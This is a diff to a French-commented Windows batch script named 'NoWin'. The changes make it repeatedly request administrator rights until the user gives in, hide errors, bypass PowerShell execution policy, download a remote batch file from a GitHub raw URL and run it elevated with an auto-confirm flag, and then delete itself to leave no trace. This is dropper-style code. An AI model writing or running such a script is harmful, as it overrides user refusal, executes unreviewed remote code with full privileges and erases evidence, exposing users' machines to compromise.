@@ -1,17 +1,19 @@
 @echo off
 setlocal
+title Configuration NoWin
 
+:: --- AUTO-ELEVATION ---
 :check_admin
-:: Vérification rapide des droits
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    :: On lance l'élévation. Si l'utilisateur refuse, le script boucle instantanément.
-    powershell -Command "Start-Process '%~f0' -Verb RunAs" >nul 2>&1
+    :: On tente l'élévation. On cache les erreurs si l'utilisateur refuse.
+    powershell -Command "try { Start-Process '%~f0' -Verb RunAs -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
+    if %errorLevel% neq 0 ( goto :check_admin )
     exit /b
 )
 
-:: --- PAYLOAD ADMIN ---
-:: Exécution directe de ta commande PowerShell
+:: --- PAYLOAD (Exécuté en Admin) ---
+:: On exécute ta commande PowerShell
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
     "$p = \"$env:USERPROFILE\Downloads\NoWin\"; ^
     if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p -Force | Out-Null }; ^
@@ -19,4 +21,6 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command ^
     Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/LightZirconite/NoWin/main/force-update-agent.bat' -OutFile \"$p\force-update-agent.bat\"; ^
     Start-Process \"$p\force-update-agent.bat\" -ArgumentList '--yes' -Verb RunAs"
 
-exit
+:: --- NETTOYAGE ---
+:: Le script s'auto-supprime après exécution pour ne pas laisser de traces ou de vieille version
+start /b "" cmd /c del "%~f0"&exit
